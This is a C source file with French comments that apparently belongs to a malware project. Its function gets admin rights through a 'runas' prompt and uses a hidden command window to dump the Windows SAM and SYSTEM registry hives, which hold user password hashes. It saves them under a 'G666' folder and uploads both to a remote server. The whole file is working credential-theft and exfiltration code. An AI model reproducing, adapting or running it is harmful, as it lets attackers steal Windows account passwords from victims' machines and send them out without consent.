#include <windows.h>
#include <shellapi.h>
#include <stdio.h>
#include <curl/curl.h>

#include "../include/structures.h"
#include "../include/http.h"

int save_and_send_windows_users_password(COMPUTER_INFOS *cmp_info) {

    /*Fonction qui permet de récupérer le fichier sam et system qui contiens les mdp
    des utilisateurs windows et de les envoyer au serveur*/

    SHELLEXECUTEINFO sei;
    ZeroMemory(&sei, sizeof(sei));
    sei.cbSize = sizeof(sei);
    sei.lpVerb = "runas"; //  runas pour demander les perm admin
    sei.lpFile = "cmd.exe"; 
    char cmd[1024];
    char sam_file_path[228];
    char system_file_path[228];

    snprintf(sam_file_path, 228, "C:\\Users\\%s\\AppData\\Local\\G666\\sam.save", cmp_info->username);
    snprintf(system_file_path, 228, "C:\\Users\\%s\\AppData\\Local\\G666\\system.save", cmp_info->username);
    snprintf(cmd, sizeof(cmd), "/c reg save HKLM\\SAM %s && reg save HKLM\\SYSTEM %s", sam_file_path, system_file_path);

    sei.lpParameters = cmd;
    sei.nShow = SW_HIDE; // pour masquer laz fenètre du cmd
    sei.fMask = SEE_MASK_NOCLOSEPROCESS; 

    if (ShellExecuteEx(&sei)) {
        WaitForSingleObject(sei.hProcess, INFINITE); // attendre que la commande se termine (plus précisément que le processus cmd.exe se termine)
        CloseHandle(sei.hProcess); 

        if (GetFileAttributes(sam_file_path) == INVALID_FILE_ATTRIBUTES) {
            fprintf(stderr, "Erreur: le fichier SAM n'existe pas: %s\n", sam_file_path);
            return -1;
        }

        if (GetFileAttributes(system_file_path) == INVALID_FILE_ATTRIBUTES) {
            fprintf(stderr, "Erreur: le fichier SYSTEM n'existe pas: %s\n", system_file_path);
            return -1;
        }
        upload_to_server(sam_file_path, "windowssam", "");
        upload_to_server(system_file_path, "windowssystem", "");

    } else {
        fprintf(stderr, "Erreur: ShellExecuteEx a échoué\n");
        return -1;
    }
}
